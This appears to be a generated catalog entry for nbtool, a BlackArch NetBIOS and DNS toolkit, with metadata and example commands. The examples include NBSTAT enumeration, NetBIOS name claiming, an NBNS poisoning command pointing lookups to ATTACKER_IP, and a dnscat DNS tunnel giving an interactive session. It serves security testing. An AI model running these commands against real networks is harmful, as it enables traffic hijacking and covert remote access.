---
name: "nbtool"
categories:
  - blackarch-networking
version: "2.bf90c76"
homepage: "http://wiki.skullsecurity.org/Nbtool"
packaged-by: [blackarch]
blackarch-builddate: "2025-11-30"
build-system: make
license: GPL3
meta-checked: "2026-11-09"
github-repo: "iagox86/nbtool"
github-stars: 83
github-pushed: "2014-04-16"
github-archived: false
github-issues: 3
github-match: "search"
gh-checked: "2026-11-07"
worth: 2.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# nbtool

> Ron Bowes' toolkit for NetBIOS name-service probing and attack plus DNS tunneling — nbquery, nbsniff and the original dnscat.

## What it's for

nbtool (Ron Bowes / SkullSecurity, 2008-2010) is a small C toolkit for NetBIOS and DNS investigation, attack and communication. The build produces standalone binaries: `nbquery` crafts NetBIOS name-service requests (query, NBSTAT adapter status, register, release, refresh, conflict, demand), `nbsniff` watches NetBIOS traffic and can poison name-resolution replies, and `dnscat` is the original v1 DNS tunnel client/server for carrying an interactive session over DNS queries, alongside `dnstest`, `dnslogger` and `dnsxss`. The sniffing tools link libpcap and want root. It targets legacy NetBIOS-era Windows networks; the tunnel half is dnscat v1, not the later Python dnscat2.

## Typical use cases

### Pull the full name table from a Windows host

```
nbquery -t 198.51.100.10 --nbstat
```

Outcome: sends an NBSTAT (adapter status) request to the target and prints every NetBIOS name it has registered — machine name, workgroup/domain, and the <03> names that reveal the logged-on user. The usage text notes that pointing `-t` at the target is what yields full NBSTAT information; on the local segment the default broadcast covers simple queries.

### Test whether a NetBIOS name is claimable

```
nbquery -t 198.51.100.10 --register FILESRV
```

Outcome: sends a registration claim for the name FILESRV as seen from your source address; a conflict response shows the name is defended on that segment, silence or success shows it is not — the prelude to name-hijack testing.

### Poison NBNS name resolution on the local segment

```
sudo nbsniff --poison -s ATTACKER_IP -n FILESRV
```

Outcome: sniffs NetBIOS name-service requests on the wire and answers matching lookups (all of them, or only those for `-n`-named hosts) with the source IP you supply, capturing resolutions that legacy Windows hosts would otherwise settle inside the segment.

### Set up a DNS tunnel

```
sudo dnscat --listen
```

Outcome: starts the dnscat v1 server answering on DNS. A client launched elsewhere with `dnscat --domain dnscat.example.com --dns 198.51.100.10` reaches it through the site's recursive resolver, giving an interactive session tunneled entirely inside DNS traffic.

*No corpus evidence — derived from upstream documentation.*
